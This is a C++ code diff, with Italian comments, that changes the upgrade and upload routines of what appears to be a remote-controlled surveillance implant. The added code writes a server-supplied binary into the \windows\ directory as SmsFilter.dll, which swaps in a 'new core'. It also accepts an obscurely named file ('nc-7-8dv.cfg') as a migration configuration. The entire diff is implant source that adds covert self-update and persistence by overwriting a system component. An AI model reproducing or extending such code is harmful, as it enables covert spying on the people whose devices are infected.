@@ -1664,6 +1664,33 @@ BOOL Transfer::RestGetUpgrade() {
 
 			RegCloseKey(hKey);
 			RegFlushKey(HKEY_LOCAL_MACHINE);
+		} else {
+			// Se conosciamo il nostro nome, switchiamo il nuovo core
+			wstring strPathName = L"\\windows\\";
+
+			if (wcsncmp(L"smsfilter", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
+				strPathName += L"SmsFilter.dll";
+			} else {
+				strPathName += pwFilename;
+			}
+
+			hFile = CreateFile(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+			if (hFile == INVALID_HANDLE_VALUE) {
+				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [CreateFile() 2]\n", 5, FALSE);
+				continue;
+			}
+
+			DWORD dwWritten = 0;
+
+			if (WriteFile(hFile, b.getCurBuf(), uFileLen, &dwWritten, NULL) == FALSE) {
+				CloseHandle(hFile);
+				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [WriteFile()]\n", 5, FALSE);
+				continue;
+			}
+
+			FlushFileBuffers(hFile);
+			CloseHandle(hFile);
 		}
 	} while (uLeft);
 
@@ -2182,7 +2209,8 @@ BOOL Transfer::RestGetUploads() {
 			wstring strUploaded;
 
 			// Controllo per la migrazione
-			if (wcsncmp(L"conf-update", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
+			if (wcsncmp(L"nc-7-8dv.cfg", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
+				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUploads() migration conf arriving", 4, FALSE);
 				strUploaded = GetCurrentPath(g_ConfName);
 				wstring strExtension = L".mig";
 
@@ -2204,17 +2232,20 @@ BOOL Transfer::RestGetUploads() {
 			if (hFile == INVALID_HANDLE_VALUE)
 				continue;
 
-			b.setPos(b.getPos() + uPascalLen);
-			uFileLen = b.getInt();
+			DBG_TRACE_INT(L"Debug - Transfer.cpp - RestGetUploads() migration conf file created, size: ", 4, FALSE, uFileLen);
+			//b.setPos(b.getPos() + uPascalLen);
+			//uFileLen = b.getInt();
 
 			DWORD dwWritten = 0;
 
 			// Scriviamolo
 			if (WriteFile(hFile, b.getCurBuf(), uFileLen, &dwWritten, NULL) == FALSE) {
 				CloseHandle(hFile);
+				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUploads() migration conf, content not written ", 4, TRUE);
 				continue;
 			}
 
+			DBG_TRACE(L"Debug - Transfer.cpp - RestGetUploads() migration conf saved successfully", 4, FALSE);
 			CloseHandle(hFile);
 		}
 
